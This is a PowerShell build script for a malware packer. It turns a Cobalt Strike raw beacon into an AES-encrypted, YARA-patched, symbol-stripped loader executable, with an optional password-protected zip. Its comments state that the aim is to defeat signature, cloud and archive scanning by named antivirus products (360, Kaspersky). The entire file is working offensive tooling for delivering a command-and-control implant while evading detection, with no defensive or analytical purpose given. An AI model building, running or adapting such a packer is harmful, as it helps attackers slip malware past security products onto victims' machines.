# ============================================================
#  build.ps1 - packer: raw beacon -> loader.exe + encrypted zip
#  Features:
#    - random AES-256 key/IV per build (new file hash every time)
#    - in-memory YARA-string patches + AES encrypt (encrypt_aes.py)
#    - optional password-protected zip output (defeats 360 archive scan)
#  Usage : powershell -ExecutionPolicy Bypass -File build.ps1 [-Beacon <path>] [-ZipPwd <pwd>] [-NoZip]
# ============================================================
param(
    [string]$Beacon = "beacon_x64.bin",   # your fresh CS raw x64 beacon (keep OUTSIDE this folder)
    [string]$Gcc     = "",                # full path to gcc.exe; empty = use PATH
    [string]$EncPy   = "",                # encrypt_aes.py; empty = same dir
    [string]$ZipPwd  = "",                # zip password; empty = auto random
    [switch]$NoZip                        # skip encrypted zip output
)

$ErrorActionPreference = "Stop"
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location $here

if (-not $EncPy) { $EncPy = Join-Path $here "encrypt_aes.py" }
if (-not $Gcc)   { $Gcc = (Get-Command gcc -ErrorAction SilentlyContinue).Source }
if (-not $Gcc)   { throw "gcc not found: install w64devkit and add bin to PATH, or pass -Gcc" }
if (-not (Test-Path $Beacon)) { throw "beacon file not found: $Beacon" }
if (-not (Test-Path $EncPy))  { throw "encrypt_aes.py not found: $EncPy" }

$env:PATH = (Split-Path $Gcc) + ";" + $env:PATH

# 1. random key/IV (hex) - new ciphertext + new loader hash every build
$KeyHex = -join ((1..32 | ForEach-Object { '{0:x2}' -f (Get-Random -Max 256) }))
$IvHex  = -join ((1..16 | ForEach-Object { '{0:x2}' -f (Get-Random -Max 256) }))

# 2. in-memory string patch + AES-256-CBC encrypt -> payload_v8.h
python $EncPy $Beacon $KeyHex $IvHex
if ($LASTEXITCODE -ne 0) { throw "encrypt step failed" }

# 3. compile (GUI subsystem, strip symbols)
gcc -mwindows -O2 -o loader.exe loader_v11.c -s
if ($LASTEXITCODE -ne 0) { throw "compile failed" }

Write-Host ""
Write-Host "[OK] loader.exe built: $((Get-Item loader.exe).Length) bytes"
Write-Host "    AES key : $KeyHex"
Write-Host "    AES iv  : $IvHex"
Write-Host "    beacon  : $Beacon"
Write-Host "    NOTE    : new key => new hash => bypass signature/cloud (360/Kaspersky)"

# 4. optional encrypted zip (defeats 360 scanning the archive before extraction)
if (-not $NoZip) {
    if (-not $ZipPwd) { $ZipPwd = -join ((1..12 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 126) })) }
    $stamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $zip = Join-Path $here ("loader_" + $stamp + ".zip")
    python (Join-Path $here "zip_enc.py") (Join-Path $here "loader.exe") $zip $ZipPwd
    if ($LASTEXITCODE -ne 0) { throw "zip step failed" }
    Write-Host "    zip     : $zip"
    Write-Host "    zip pwd : $ZipPwd   (remember this to extract)"
}
